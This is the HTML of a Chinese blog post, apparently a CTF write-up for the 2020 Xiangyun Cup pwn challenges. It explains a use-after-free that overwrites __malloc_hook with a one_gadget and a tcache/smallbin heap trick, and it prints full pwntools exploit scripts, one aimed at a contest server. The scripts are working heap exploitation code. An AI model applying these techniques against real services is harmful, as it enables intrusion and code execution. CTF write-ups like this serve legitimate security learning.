@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/33.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/22.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/11.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"l0ne1y.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="祥云杯">
+<meta property="og:url" content="https://l0ne1y.github.io/2020/11/24/%E7%A5%A5%E4%BA%91%E6%9D%AF/index.html">
+<meta property="og:site_name" content="L0ne1y&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/11/23/zvLd14IhOm7KJfo.jpg">
+<meta property="article:published_time" content="2020-11-23T20:13:32.000Z">
+<meta property="article:modified_time" content="2020-11-23T12:15:06.868Z">
+<meta property="article:author" content="L0ne1y">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="比赛">
+<meta property="article:tag" content="祥云杯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/11/23/zvLd14IhOm7KJfo.jpg">
+
+<link rel="canonical" href="https://l0ne1y.github.io/2020/11/24/%E7%A5%A5%E4%BA%91%E6%9D%AF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>祥云杯 | L0ne1y's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="L0ne1y's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">L0ne1y's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">29</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">13</span></a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l0ne1y.github.io/2020/11/24/%E7%A5%A5%E4%BA%91%E6%9D%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/2.JPG">
+      <meta itemprop="name" content="L0ne1y">
+      <meta itemprop="description" content="纷繁世间，一切从简">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L0ne1y's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          祥云杯
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-11-23 20:13:32 / 修改时间：12:15:06" itemprop="dateCreated datePublished" datetime="2020-11-23T20:13:32Z">2020-11-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="https://i.loli.net/2020/11/23/zvLd14IhOm7KJfo.jpg" alt="5fb371dd5e3db.jpg"></p>
+<a id="more"></a>
+
+<p>太菜了，全靠队友带，打了俩天就出了俩个，还有几个过几天复现一下，再来更新wp。</p>
+<h3 id="影流之主"><a href="#影流之主" class="headerlink" title="影流之主"></a>影流之主</h3><h4 id="checksec检查："><a href="#checksec检查：" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>程序存在 uaf 漏洞，而且限制了 add，edit 等函数的使用此时，但是这里只限制了 if(0)，如果时if(-1)的一些情况就可以绕过，也就没有了使用函数次数的限制了。这里首先通过 uaf 漏洞将 chunk 申请到 bss 段，修改 chunk 指针为free_got 地址，然后利用 show来泄露libc，之后多次edit就可以绕过限制edit函数次数，之后将chunk地址修改为malloc_hook，写入 one_gadget，来 getshell。</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;8.131.69.237&#39;,45123)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">def add():</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">def free(index):</span><br><span class="line">sh.sendline(&#39;2&#39;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">sleep(0.1)</span><br><span class="line">def edit(index,content):</span><br><span class="line">sh.sendline(&#39;3&#39;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.send(content)</span><br><span class="line">def edit_index(index):</span><br><span class="line">sh.sendline(&#39;3&#39;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">sleep(0.1)</span><br><span class="line">def show(index):</span><br><span class="line">sh.sendline(&#39;4&#39;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">sleep(0.1)</span><br><span class="line">def glob(content):</span><br><span class="line">sh.sendline(&#39;5&#39;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">#gdb.attach(sh,&#39;b *0x0000000000400C14&#39;)</span><br><span class="line">#raw_input()</span><br><span class="line">sh.sendline(content)</span><br><span class="line">sleep(0.1)</span><br><span class="line">add() #0</span><br><span class="line">free(0)</span><br><span class="line">edit(0,p64(0x602060-0x23))</span><br><span class="line">add() #1</span><br><span class="line">add() #2</span><br><span class="line">edit(2,&#39;aaa&#39;+p64(0)*2+p64(elf.got[&#39;free&#39;]))</span><br><span class="line">show(0)</span><br><span class="line">free_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;free_addr : &#39; +hex(free_addr))</span><br><span class="line">libc_base&#x3D;free_addr-libc.symbols[&#39;free&#39;]</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">one_gadget&#x3D;libc_base+0xf1207</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">edit_index(2)</span><br><span class="line">edit_index(2)</span><br><span class="line">edit_index(2)</span><br><span class="line">edit(2,&#39;bbb&#39;+p64(0)*2+p64(malloc_hook))</span><br><span class="line">edit(0,p64(one_gadget))</span><br><span class="line">add()</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Beauty-Of-ChangChun"><a href="#Beauty-Of-ChangChun" class="headerlink" title="Beauty_Of_ChangChun"></a>Beauty_Of_ChangChun</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>程序没有将 free 后的指针置 0，并且在将 size 置 0 的时候，但是只将它的一个字节置 0，所有当我们申请 0x100 大小的 chunk 时，可以绕过。程序会把 flag 输入到程序的某个地方。只要我们能够让这俩个地方的内容相等，我们就可以拿到 flag。这里我们通过 calloc 函数的特性绕过 tcache bin 检查，并且将 tcache bin 填充满，将chunk1，chunk0，free 掉进入 unsorted bin，泄露 libc 地址，和 heap 地址。然后通过程序中的函数，calloc(1uLL, 0x3FFuLL);将我们的之前在 unsorted bin 中的 chunk 分配到 small bin 中，修改chunk0 的 bk 指针，之后通过一次 malloc 申请将 tcache bin 中的 chunk 申请回来，此时 tcache bin 中的 chunk 为 6 个，此时进行 calloc 将smallbin 中的 chunk 申请回来，small bin 中剩余的 chunk 会被链入 tcache bin 中。而且此时我们伪造的 bk 指针的地方会被写入 libc 的值。之后就是我们将和它一样的 libc 写入一个 chunk 中，进行比较后拿到 flag。</p>
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">#sh&#x3D;remote(&#39;112.126.71.170&#39;,43652)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">def add(size):</span><br><span class="line">sh.recvuntil(&#39;4: Enjoy scenery\n&#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;size:\n&#39;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">def free(index):</span><br><span class="line">sh.recvuntil(&#39;4: Enjoy scenery\n&#39;)</span><br><span class="line">sh.sendline(&#39;2&#39;)</span><br><span class="line">sh.recvuntil(&#39;idx:\n&#39;)</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">def edit(index,content):</span><br><span class="line">sh.recvuntil(&#39;4: Enjoy scenery\n&#39;)</span><br><span class="line">sh.sendline(&#39;3&#39;)</span><br><span class="line">sh.recvuntil(&#39;idx:\n&#39;)</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">sh.recvuntil(&#39;chat:\n&#39;)</span><br><span class="line">sh.send(content)</span><br><span class="line">def show(index):</span><br><span class="line">sh.recvuntil(&#39;4: Enjoy scenery\n&#39;)</span><br><span class="line">sh.sendline(&#39;4&#39;)</span><br><span class="line">sh.recvuntil(&#39;idx:\n&#39;)</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">def malloc(content):</span><br><span class="line">sh.recvuntil(&#39;4: Enjoy scenery\n&#39;)</span><br><span class="line">sh.sendline(&#39;5&#39;)</span><br><span class="line">sh.send(content)</span><br><span class="line">def calloc():</span><br><span class="line">sh.recvuntil(&#39;4: Enjoy scenery\n&#39;)</span><br><span class="line">sh.sendline(&#39;666&#39;)</span><br><span class="line">def malloc_index(index):</span><br><span class="line">sh.recvuntil(&#39;4: Enjoy scenery\n&#39;)</span><br><span class="line">sh.sendline(&#39;5&#39;)</span><br><span class="line">sh.recvuntil(&#39;input idx\n&#39;)</span><br><span class="line">sh.send(str(index))</span><br><span class="line">sh.recvuntil(&#39;A gift from ChangChun People\n&#39;)</span><br><span class="line">gift_addr&#x3D;int(sh.recv(12),16)</span><br><span class="line">sh.success(&#39;gift_addr : &#39; +hex(gift_addr))</span><br><span class="line">add(0x100) #0</span><br><span class="line">add(0xf9) #1</span><br><span class="line">free(1)</span><br><span class="line">add(0x100) #1</span><br><span class="line">for i in range(6):</span><br><span class="line">add(0xf9) #2</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil(&#39;see\n&#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil(&#39;see\n&#39;)</span><br><span class="line">heap_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;heap_addr : &#39; +hex(heap_addr))</span><br><span class="line">calloc()</span><br><span class="line">edit(0,p64(heap_addr)+p64(gift_addr-0x10))</span><br><span class="line">malloc(&#39;aaaa&#39;)</span><br><span class="line">add(0x100) #2</span><br><span class="line">edit(2,p64(main_arena+0x100))</span><br><span class="line">malloc_index(2)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><h3 id="garden"><a href="#garden" class="headerlink" title="garden"></a>garden</h3>
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章推荐</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\2020\11\16\湖湘杯\" rel="bookmark">湖湘杯</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\2020\11\03\铁三比赛第一，三，四赛区wp\" rel="bookmark">铁三比赛第一，三，四赛区</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\2020\11\02\第十一届极客大挑战\" rel="bookmark">第十一届极客大挑战</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\2020\10\03\PWN做题记录\" rel="bookmark">PWN做题记录</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\2020\11\01\ELF文件动态链接过程\" rel="bookmark">ELF文件动态链接过程</a></div>
+    </li>
+  </ul>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>L0ne1y
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://l0ne1y.github.io/2020/11/24/%E7%A5%A5%E4%BA%91%E6%9D%AF/" title="祥云杯">https://l0ne1y.github.io/2020/11/24/祥云杯/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag"># 比赛</a>
+              <a href="/tags/%E7%A5%A5%E4%BA%91%E6%9D%AF/" rel="tag"># 祥云杯</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/16/%E6%B9%96%E6%B9%98%E6%9D%AF/" rel="prev" title="湖湘杯">
+      <i class="fa fa-chevron-left"></i> 湖湘杯
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81MDAwMC8yNjQ5MQ=="></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#影流之主"><span class="nav-number">1.</span> <span class="nav-text">影流之主</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#checksec检查："><span class="nav-number">1.1.</span> <span class="nav-text">checksec检查：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用"><span class="nav-number">1.2.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP"><span class="nav-number">1.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Beauty-Of-ChangChun"><span class="nav-number">2.</span> <span class="nav-text">Beauty_Of_ChangChun</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#checksec检查"><span class="nav-number">2.1.</span> <span class="nav-text">checksec检查</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用-1"><span class="nav-number">2.2.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP-1"><span class="nav-number">2.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babypwn"><span class="nav-number">3.</span> <span class="nav-text">babypwn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#garden"><span class="nav-number">4.</span> <span class="nav-text">garden</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="L0ne1y"
+      src="/images/2.JPG">
+  <p class="site-author-name" itemprop="name">L0ne1y</p>
+  <div class="site-description" itemprop="description">纷繁世间，一切从简</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/L0ne1y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0ne1y" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1532990032@qq.com" title="E-Mail → mailto:1532990032@qq.com" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">L0ne1y</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">315k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:47</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
